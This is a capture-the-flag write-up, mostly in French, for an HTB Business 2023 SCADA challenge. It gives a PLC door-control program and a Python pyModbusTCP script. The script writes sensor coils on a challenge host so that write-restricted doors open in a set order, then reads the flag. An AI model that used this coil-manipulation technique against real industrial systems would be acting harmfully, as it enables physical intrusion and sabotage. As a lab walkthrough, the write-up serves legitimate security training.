---
title: "Breach - Scada"
author: "xThaz"
context: "HTB Business 2023"
tags : ["Write-Up", "HTB"]
---
# Breach - SCADA

## Consigne

Instructions.txt
```
1. The door order that must be achieved to successfully allow the team to infiltrate the building is: [door_3, door_0, door_4, door_1, door_2] and must be sequential.

2. The coils for the doors have restricted access on the Modbus network and can not be written.

3. The sensors are hardwired to coils, thus driving the coil will result in the sensor signal being altered.

4. SYSTEM REST: Upon mission completion, the system will reset after approximately two minutes.

5. FLAG: the flag will be available on the holding registers starting at address 4 upon completion of the mission.
```

door_controle_subsystem.st
```
// Configuration notes:
// 8-bit word size
// Modify Modbus coil access to restrict door coils
PROGRAM door_control
  VAR
    system_active AT %QX75.2 : BOOL := 0;
  END_VAR
  VAR
    Door_0 AT %Q4.0 : BOOL := 0; // Restrict write access via Modbus
    Door_1 AT %Q4.1 : BOOL := 0; // Restrict write access via Modbus
    Door_2 AT %Q4.2 : BOOL := 0; // Restrict write access via Modbus
    Door_3 AT %Q4.3 : BOOL := 0; // Restrict write access via Modbus
    Door_4 AT %Q4.4 : BOOL := 0; // Restrict write access via Modbus
    sensor_0 AT %QX8.0 : BOOL := 0;
    sensor_1 AT %QX8.1 : BOOL := 0;
    sensor_2 AT %QX8.2 : BOOL := 0;
    sensor_3 AT %QX8.3 : BOOL := 0;
    sensor_4 AT %QX8.4 : BOOL := 0;
    sensor_5 AT %QX37.0 : BOOL := 0;
    sensor_6 AT %QX37.1 : BOOL := 0;
    sensor_7 AT %QX37.2 : BOOL := 0;
    sensor_8 AT %QX37.3 : BOOL := 0;
    sensor_9 AT %QX37.4 : BOOL := 0;
    sensor_10 AT %QX52.0 : BOOL := 0;
    sensor_11 AT %QX52.6 : BOOL := 0;
    sensor_12 AT %QX16.6 : BOOL := 0;
    sensor_13 AT %QX16.7 : BOOL := 0;
    sensor_14 AT %QX16.0 : BOOL := 0;
  END_VAR
  VAR
    TON0 : TON;
  END_VAR
  VAR_TEMP
    door_timer_0 : TIME;
    door_timer_1 : TIME;
    door_timer_2 : TIME;
    door_timer_3 : TIME;
    door_timer_4 : TIME;
  END_VAR
  VAR
    TON1 : TON;
    TON2 : TON;
    TON3 : TON;
    TON4 : TON;
  END_VAR

  TON0(IN := NOT(Door_4) AND NOT(Door_3) AND NOT(Door_2) AND NOT(Door_1) AND sensor_4 AND NOT(sensor_2) AND sensor_1 AND sensor_0 AND system_active, PT := T#8000ms);
  Door_0 := TON0.Q;
  door_timer_0 := TON0.ET;
  TON1(IN := NOT(Door_4) AND NOT(Door_3) AND NOT(Door_2) AND NOT(Door_0) AND sensor_7 AND NOT(sensor_6) AND sensor_5 AND sensor_0 AND system_active, PT := T#5000ms);
  Door_1 := TON1.Q;
  door_timer_1 := TON1.ET;
  TON2(IN := NOT(Door_4) AND NOT(Door_3) AND NOT(Door_1) AND NOT(Door_0) AND sensor_11 AND NOT(sensor_7) AND sensor_10 AND sensor_5 AND system_active, PT := T#8000ms);
  Door_2 := TON2.Q;
  door_timer_2 := TON2.ET;
  TON3(IN := NOT(Door_4) AND NOT(Door_1) AND NOT(Door_2) AND NOT(Door_0) AND sensor_13 AND sensor_12 AND NOT(sensor_11) AND sensor_10 AND system_active, PT := T#5000ms);
  Door_3 := TON3.Q;
  door_timer_3 := TON3.ET;
  TON4(IN := NOT(Door_1) AND NOT(Door_3) AND NOT(Door_2) AND NOT(Door_0) AND sensor_14 AND sensor_13 AND sensor_12 AND sensor_10 AND system_active, PT := T#8000ms);
  Door_4 := TON4.Q;
  door_timer_4 := TON4.ET;
END_PROGRAM


CONFIGURATION Config0

  RESOURCE Res0 ON PLC
    TASK task0(INTERVAL := T#20ms,PRIORITY := 0);
    PROGRAM instance0 WITH task0 : door_control;
  END_RESOURCE
END_CONFIGURATION
```

## Solve

Infos importantes:
- On doit ouvrir les portes un par une, dans l'ordre
- les mots font 8 bits
- on peut controler tous les coils en temps réels, sauf ceux des portes, qui sont en readonly.

On observe que les changement mettent quelques secondes à être prit en compte, et qu'il faut que `system_active` soit active constement pour que le système bouge.

Il ne reste plus qu'a activer les bonnes combinaison de capteurs pour activer les portes.

J'ai fais des fonctions helpers pour activer/desactiver des capteurs plus facilement.

La seule vraie difficculté était que la séquences pour activer la porte 4 était une sur-séquence de celle pour la 3. Le script rencontrant d'abord la 3, il ouvrait la mauvaise porte. Il suffisait d'activer un capteur suplementaire (le 11) car il n'avait aucune incidence sur la porte 4, mais empêchait la porte 3 de s'ouvrir.

NB: pas besoin de tout éteindre à chaque fois comme j'ai fais, mais c'était pour etre safe.

```python
from pyModbusTCP.client import ModbusClient
import time

HOST = "94.237.56.111"
PORT = 53208

c = ModbusClient(host=HOST, port=PORT, unit_id=1, auto_open=True)

def turn_sensor_on(sensor):
    c.write_single_coil(8 * sensor[0] + sensor[1], True)

def turn_sensors_on(sensors):
    for sensor in sensors:
        turn_sensor_on(sensor)

def turn_sensor_off(sensor):
    c.write_single_coil(8 * sensor[0] + sensor[1], False)

def turn_sensors_off(sensors):
    for sensor in sensors:
        turn_sensor_off(sensor)

def turn_everything_off():
    for i in range(338): # 56 * 6
        c.write_single_coil(i, False)

def read_sensor(sensor):
    return c.read_coils(8 * sensor[0] + sensor[1], 1)[0]

def wait_for_sensor(sensor, state):
    while read_sensor(sensor) != state:
        time.sleep(0.1)

# Variables
system_active = (75, 2)
Door_0 = (4, 0)
Door_1 = (4, 1)
Door_2 = (4, 2)
Door_3 = (4, 3)
Door_4 = (4, 4)
sensor_0 = (8, 0)
sensor_1 = (8, 1)
sensor_2 = (8, 2)
sensor_3 = (8, 3)
sensor_4 = (8, 4)
sensor_5 = (37, 0)
sensor_6 = (37, 1)
sensor_7 = (37, 2)
sensor_8 = (37, 3)
sensor_9 = (37, 4)
sensor_10 = (52, 0)
sensor_11 = (52, 6)
sensor_12 = (16, 6)
sensor_13 = (16, 7)
sensor_14 = (16, 0)

# Clean up
turn_everything_off()
# Start system
turn_sensor_on(system_active)

# Activate door 3
turn_sensors_on([sensor_13, sensor_12, sensor_10])
turn_sensors_off([sensor_0, sensor_1, sensor_2, sensor_3, sensor_4, sensor_5, sensor_6, sensor_7, sensor_8, sensor_9, sensor_11, sensor_14])
wait_for_sensor(Door_3, True)
print("Door 3 opened")
# Deactivate door 3
turn_everything_off()
wait_for_sensor(Door_3, False)
print("Door 3 closed")

# Activate door 0
turn_sensors_on([sensor_4, sensor_1, sensor_0])
turn_sensors_off([sensor_2, sensor_3, sensor_5, sensor_6, sensor_7, sensor_8, sensor_9, sensor_10, sensor_11, sensor_12, sensor_13, sensor_14])
wait_for_sensor(Door_0, True)
print("Door 0 opened")
# Deactivate door 0
turn_everything_off()
wait_for_sensor(Door_0, False)
print("Door 0 closed")

# Activate door 4
turn_sensors_on([sensor_11, sensor_14, sensor_13, sensor_12, sensor_10])
turn_sensors_off([sensor_0, sensor_1, sensor_2, sensor_3, sensor_4, sensor_5, sensor_6, sensor_7, sensor_8, sensor_9])
wait_for_sensor(Door_4, True)
print("Door 4 opened")
# Deactivate door 4
turn_everything_off()
wait_for_sensor(Door_4, False)
print("Door 4 closed")

# Activate door 1
turn_sensors_on([sensor_7, sensor_5, sensor_0])
turn_sensors_off([sensor_1, sensor_2, sensor_3, sensor_4, sensor_6, sensor_8, sensor_9, sensor_10, sensor_11, sensor_12, sensor_13, sensor_14])
wait_for_sensor(Door_1, True)
print("Door 1 opened")
# Deactivate door 1
turn_everything_off()
wait_for_sensor(Door_1, False)
print("Door 1 closed")

# Activate door 2
turn_sensors_on([sensor_11, sensor_10, sensor_5])
turn_sensors_off([sensor_0, sensor_1, sensor_2, sensor_3, sensor_4, sensor_6, sensor_7, sensor_8, sensor_9, sensor_12, sensor_13, sensor_14])
wait_for_sensor(Door_2, True)
print("Door 2 opened")
# Deactivate door 2
turn_everything_off()
wait_for_sensor(Door_2, False)
print("Door 2 closed")

print("Flag:")
print(c.read_holding_registers(4, 125))
```
